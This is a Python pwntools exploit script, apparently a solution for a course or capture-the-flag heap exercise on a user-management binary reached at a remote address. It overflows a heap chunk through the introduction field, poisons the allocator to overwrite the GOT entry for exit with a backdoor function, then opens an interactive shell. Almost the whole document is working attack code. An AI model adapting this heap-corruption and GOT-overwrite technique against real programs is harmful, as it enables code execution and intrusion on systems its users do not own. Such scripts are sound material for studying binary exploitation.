from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./overflow')

REMOTE = 1
DEBUG = 0

if REMOTE:
    p = remote('8.154.20.109', 10401)
    p.sendlineafter(b'StudentID', b'3220103784')
else:
    p = process('./overflow')

def AddUser(name: bytes, password: bytes, intro: bytes, motto: bytes) -> int:
   p.sendlineafter(b"> ", b"1")
   p.sendlineafter(b'name > ', name)
   p.sendlineafter(b'password > ', password)
   p.sendlineafter(b'introduction > ', intro)
   p.sendlineafter(b'motto > ', motto)
   p.recvuntil(b"at index ", drop=True)
   data = p.recvline().strip()
   return int(data)

def DeleteUser(index: int, password: bytes):
   p.sendlineafter(b'> ', b'2') 
   p.sendlineafter(b'index > ', str(index).encode())
   p.sendlineafter(b'password > ', password)

def EditUser(index: int, password: bytes, name: bytes, intro: bytes, motto: bytes):
   p.sendlineafter(b'> ', b'4')
   p.sendlineafter(b'index > ', str(index).encode())
   p.sendlineafter(b'password > ', password) 
   p.sendlineafter(b'new name > ', name)
   p.sendlineafter(b'new introduction > ', intro)
   p.sendlineafter(b'new motto > ', motto)

idx1 = AddUser(b"user1", b"1111", b"AAAA", b"aaaa")
idx2 = AddUser(b"user2", b"2222", b"BBBB", b"bbbb") 
idx3 = AddUser(b"user3", b"3333", b"CCCC", b"cccc") 

DeleteUser(idx1, b"1111")
DeleteUser(idx3, b"3333")

payload = b"\x00"*72 + b"\x71" + b"\x00"*7 + p64(elf.got["exit"])

EditUser(idx2, b"2222", b"Anyaa", payload, b"b")

use = AddUser(b"", b"", b"", b"") 
use = AddUser(p64(elf.sym["backdoor"]), b"", b"", b"") 

p.recvuntil(b"[ 5 ] leave\n> ")
p.sendline(b"9")

p.interactive()
